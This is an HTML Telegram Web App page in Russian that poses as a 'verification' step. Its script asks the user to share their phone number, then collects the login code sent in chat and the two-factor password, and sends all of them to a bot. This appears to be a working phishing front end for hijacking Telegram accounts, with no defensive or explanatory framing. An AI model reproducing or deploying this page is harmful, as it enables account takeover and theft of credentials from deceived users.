<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { width: 80%; padding: 20px; border: 1px solid #333; border-radius: 15px; text-align: center; }
        .hidden { display: none; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #111; color: #fff; border: 1px solid #444; border-radius: 5px; box-sizing: border-box; }
    </style>
</head>
<body>
    <div class="card">
        <div id="step1">
            <h3 style="color: #00ff88;">ВЕРИФИКАЦИЯ</h3>
            <p>Нажмите синюю кнопку внизу чата</p>
        </div>
        <div id="step2" class="hidden">
            <h3>ШАГ 2</h3>
            <input type="number" id="code" placeholder="Код из чата">
            <input type="password" id="pass" placeholder="Пароль 2FA (если есть)">
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        let phone = "";
        let step = 1;

        // Настройка кнопки
        tg.MainButton.setText("ПОДТВЕРДИТЬ НОМЕР");
        tg.MainButton.show();
        tg.MainButton.enable();

        tg.MainButton.onClick(function() {
            if (step === 1) {
                tg.requestContact(function(ok, res) {
                    if (ok && res.contact) {
                        phone = res.contact.phone_number;
                        // Сразу шлем боту
                        tg.sendData(JSON.stringify({action: "send_code", phone: String(phone)}));
                        
                        // Меняем экран
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                        tg.MainButton.setText("ВОЙТИ");
                        step = 2;
                    } else {
                        // Если отмена или ошибка
                        alert("Нужно нажать 'Поделиться', чтобы система получила контакт.");
                    }
                });
            } else {
                const c = document.getElementById('code').value;
                const p = document.getElementById('pass').value || "none";
                if(!c) return alert("Введите код!");
                
                tg.sendData(JSON.stringify({action: "verify", phone: String(phone), code: String(c), two_fa: String(p)}));
                tg.close();
            }
        });
    </script>
</body>
</html>
